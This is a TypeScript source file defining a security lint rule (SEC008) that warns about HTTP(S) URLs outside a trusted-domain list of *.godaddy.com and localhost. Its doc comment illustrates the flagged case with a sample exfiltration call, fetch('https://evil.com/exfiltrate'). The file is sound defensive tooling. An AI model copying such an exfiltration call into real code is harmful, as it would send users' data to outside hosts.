import ts from "typescript";
import { isTrustedDomain } from "../config.ts";
import { getStringLiteralValue, matchesUrl } from "../matchers.ts";
import type { Rule } from "../types.ts";

/**
 * SEC008: External URL detection (warning)
 *
 * Detects HTTP(S) URLs that are not in the trusted domains list.
 * This is a warning to help identify potential data exfiltration or
 * unexpected external dependencies.
 *
 * **Warned patterns:**
 * - http:// or https:// URLs not matching trusted domains
 *
 * **Trusted domains:**
 * - *.godaddy.com
 * - localhost
 * - 127.0.0.1
 *
 * **Severity:** warn
 *
 * **Remediation:**
 * Review external URLs. If legitimate, document their purpose.
 * If possible, use GoDaddy APIs instead of external services.
 *
 * @example
 * // ⚠️ Warning
 * fetch('https://evil.com/exfiltrate');
 * const url = 'http://malicious.org/data';
 *
 * // ✅ No warning
 * fetch('https://api.godaddy.com/v1/data');
 * const local = 'http://localhost:3000';
 */
export const SEC008: Rule = {
	meta: {
		id: "SEC008",
		defaultSeverity: "warn",
		title: "External URL detection",
		description:
			"Warns about HTTP(S) URLs not matching trusted domains (*.godaddy.com, localhost, 127.0.0.1)",
		remediation:
			"Review external URLs. Document their purpose or use GoDaddy APIs instead.",
	},
	create: (ctx) => {
		function checkUrl(node: ts.Node, str: string): void {
			if (matchesUrl(str) && !isTrustedDomain(str, ctx.config)) {
				ctx.report(
					`Warning: External URL '${str}' detected. Review if this is necessary or use GoDaddy APIs instead.`,
					node,
				);
			}
		}

		return {
			[ts.SyntaxKind.StringLiteral]: (node: ts.Node) => {
				const literal = node as ts.StringLiteral;
				checkUrl(node, literal.text);
			},
			[ts.SyntaxKind.NoSubstitutionTemplateLiteral]: (node: ts.Node) => {
				const value = getStringLiteralValue(node);
				if (value) {
					checkUrl(node, value);
				}
			},
			[ts.SyntaxKind.TemplateExpression]: (node: ts.Node) => {
				// For template expressions with substitutions, check the head and spans
				const template = node as ts.TemplateExpression;
				const headText = template.head.text;
				if (matchesUrl(headText)) {
					checkUrl(node, headText);
				}
			},
		};
	},
};
